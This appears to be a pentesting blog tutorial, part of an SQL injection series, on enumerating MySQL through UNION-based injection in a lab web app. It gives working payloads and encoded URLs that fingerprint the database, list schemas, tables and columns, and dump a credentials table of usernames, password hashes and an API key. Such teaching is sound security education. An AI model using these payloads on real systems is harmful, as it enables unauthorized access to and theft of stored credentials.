---
title: "SQLi Series - Database Enumeration I  - 05"
seoTitle: "Understanding Database Enumeration Techniques"
seoDescription: "Learn how to perform database enumeration using SQL injections to identify DBMS types, databases, tables, and columns effectively"
datePublished: Sat Apr 20 2024 18:31:24 GMT+0000 (Coordinated Universal Time)
cuid: clv8fr1tu000009ldbe2t4g99
slug: database-enumeration
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1713637844383/d831c52e-d8e7-430c-b263-65ac35aece3f.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1713637879218/0a198e22-dbb7-4cf7-989c-452481c967ca.png
tags: databases, pentesting, redteaming

---

1. * The process of gathering information about the database using SQL queries within SQL injections
        
    * Involves identifying the DBMS type, available databases, tables, and columns
        
    * Crucial for properly forming SELECT queries to extract data
        
2. Prerequisites
    
    * Understanding of SQL queries in MySQL
        
    * Knowledge of SQL injection techniques
        
    * Access to a vulnerable web application with SQL injection flaws
        

## **MySQL Fingerprinting**

1. Why is MySQL Fingerprinting Important?
    
    * Different DBMS have different queries and syntax
        
    * Identifying the DBMS helps in using the correct queries for enumeration
        
    * Narrows down the focus to MySQL-specific techniques
        
2. Initial Guesses Based on Web Server
    
    * Apache or Nginx web server suggests Linux OS and likely MySQL DBMS
        
    * Microsoft IIS web server suggests Microsoft OS and likely MSSQL DBMS
        
    * Not always accurate, as various databases can be used with any web server or OS
        
3. MySQL-Specific Fingerprinting Queries
    

| Query | When to Use | Expected Output | Wrong Output |
| --- | --- | --- | --- |
| SELECT @@version | Full query output available | MySQL version (e.g., 10.3.22-MariaDB-1ubuntu1) | Error or different DBMS version |
| SELECT POW(1,1) | Only numeric output | 1 | Error |
| SELECT SLEEP(5) | Blind/No output | Delays response by 5 seconds and returns 0 | No delay in response |

Example:

* Trying `@@version` in the SQL injection payload returns "10.3.22-MariaDB-1ubuntu1"
    
* Confirms the DBMS is MariaDB, similar to MySQL
    
* With direct query output, no need to test other payloads
    

## **INFORMATION\_SCHEMA Database**

1. What is the INFORMATION\_SCHEMA Database?
    
    * Contains metadata about the databases and tables on the server
        
    * Crucial for exploiting SQL injection vulnerabilities
        
    * Allows retrieving information needed for forming SELECT queries
        
2. Required Information for SELECT Queries
    
    * List of databases
        
    * List of tables within each database
        
    * List of columns within each table
        
3. Referencing Tables in Different DatabasesExample: `SELECT * FROM my_database.users;`
    
    * INFORMATION\_SCHEMA is a separate database
        
    * Tables cannot be directly called with SELECT statement
        
    * Use the dot '.' operator to reference tables in another database
        

## **SCHEMATA Table**

1. Purpose of the SCHEMATA Table
    
    * Contains information about all databases on the server
        
    * Used to obtain database names for further enumeration
        
    * The `SCHEMA_NAME` column holds the database names
        
2. Testing the Query Locally
    

Query:

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Output:

```sql
Copy code+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
```

Note: The first three databases are default MySQL databases and can be ignored during enumeration.

1. Using UNION SQL Injection to Retrieve Database Names
    

Payload:

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Example URL:

```sql
search.php?port_code=cn'+UNION+select+1%2Cschema_name%2C3%2C4+from+INFORMATION_SCHEMA.SCHEMATA--+-
```

Output:

* Apart from default databases, "ilfreight" and "dev" databases are discovered
    

1. Finding the Current Database
    
    * Useful to know which database the web application is using
        
    * Can be found using the `SELECT database()` query
        

Payload:

```sql
cn' UNION select 1,database(),2,3-- -
```

Example URL:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2Cdatabase()%2C2%2C3--+-
```

Output:

* Shows the current database is "ilfreight"
    
* The "dev" database looks interesting for further enumeration
    

## **TABLES Table**

1. Purpose of the TABLES Table
    
    * Contains information about all tables across the databases
        
    * Used to retrieve table names for querying with SELECT statements
        
    * The `TABLE_NAME` column stores table names
        
    * The `TABLE_SCHEMA` column indicates the database each table belongs to
        
2. Retrieving Tables within a Specific Database
    

Payload:

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Note:

* Replace column numbers '2' and '3' with 'TABLE\_NAME' and 'TABLE\_SCHEMA' to get both outputs
    
* Add a condition `(where table_schema='dev')` to filter tables only from the "dev" database
    

Example URL:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2CTABLE_NAME%2CTABLE_SCHEMA%2C4+from+INFORMATION_SCHEMA.TABLES+where+table_schema%3D'dev'--+-
```

Output:

* Reveals four tables in the "dev" database: credentials, framework, pages, and posts
    
* The "credentials" table could contain sensitive information worth investigating
    

## **COLUMNS Table**

1. Purpose of the COLUMNS Table
    
    * Contains information about all columns present in the databases
        
    * Helps find column names to query a table
        
    * The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns are useful
        
2. Retrieving Column Names for a Specific Table
    

Payload:

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Example URL:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2CCOLUMN_NAME%2CTABLE_NAME%2CTABLE_SCHEMA+from+INFORMATION_SCHEMA.COLUMNS+where+table_name%3D'credentials'--+-
```

Output:

* Shows the "credentials" table has two columns: username and password
    

## **Extracting Data**

1. Forming the UNION Query
    
    * With the database, table, and column information, a SELECT query can be formed
        
    * Place the desired column names in place of the corresponding column numbers
        

Payload:

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Note: Use the dot operator to refer to the "credentials" table in the "dev" database

Example URL:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn'+UNION+select+1%2C+username%2C+password%2C+4+from+dev.credentials--+-
```

Output:

* Retrieves all entries from the "credentials" table
    
* Contains sensitive information like password hashes and an API key
    

## **Conclusion**

* Database enumeration is a crucial step in SQL injection exploitation
    
* Involves identifying the DBMS, databases, tables, and columns
    
* The INFORMATION\_SCHEMA database provides metadata for forming SELECT queries
    
* MySQL fingerprinting helps in using the correct syntax and queries
    
* Retrieving data from specific tables requires knowing the database, table, and column names
    
* Be cautious when dealing with sensitive information and ensure proper authorization
    

## **Additional Resources**

* [MySQL Documentation](https://dev.mysql.com/doc/)
    
* [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
    
* [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)